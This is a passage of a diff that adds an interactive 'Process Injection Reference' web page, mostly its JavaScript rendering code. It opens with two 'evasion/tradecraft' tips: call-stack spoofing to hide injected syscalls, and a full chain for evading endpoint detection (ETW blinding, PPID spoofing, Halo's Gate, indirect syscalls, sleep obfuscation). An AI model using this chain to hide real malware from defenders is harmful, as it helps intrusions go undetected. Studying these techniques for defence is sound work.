+{t:"Stack spoofing essential for syscall injection",d:"Return address chain reveals injection source. Spoof through BaseThreadInitThunk \u2192 RtlUserThreadStart."},
+{t:"Full chain: the gold standard",d:"ETW blind \u2192 PPID spoof + CIG child \u2192 Halo's Gate SSN \u2192 shared section map \u2192 indirect syscall + stack spoof \u2192 sleep obfuscation."}
+]
+};
+
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='crt')flow=fCRT();else if(S.s==='dll')flow=fDLL();else if(S.s==='shc')flow=fSHC();
+else if(S.s==='hol')flow=fHOL();else if(S.s==='cbk')flow=fCBK();else if(S.s==='adv')flow=fADV();
+else if(S.s==='sys')flow=fSYS();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+
+var thtml=tricks.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No evasion tricks.</div>':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">EVASION / TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Process Injection Reference</h1><div class="sub">Classic \u2022 DLL \u2022 Shellcode \u2022 Hollowing \u2022 Callbacks \u2022 Advanced \u2022 Syscall \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Evasion'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"Classic"},{c:"#60a5fa",l:"DLL"},{c:"#a78bfa",l:"Shellcode"},{c:"#f59e0b",l:"Hollowing"},{c:"#34d399",l:"Callbacks"},{c:"#e879f9",l:"Advanced"},{c:"#fbbf24",l:"Syscall"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//'),si2=(c.l==='asm'?line.indexOf(';'):-1);
+var cs=ci2>=0?ci2:(si2>=0?si2:-1);
+if(cs>=0)return esc(line.slice(0,cs))+'<span class="cm">'+esc(line.slice(cs))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);
+};
+});
+
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);
+};
+});
+}
+render();
+
+</script>
+</body>
+</html>
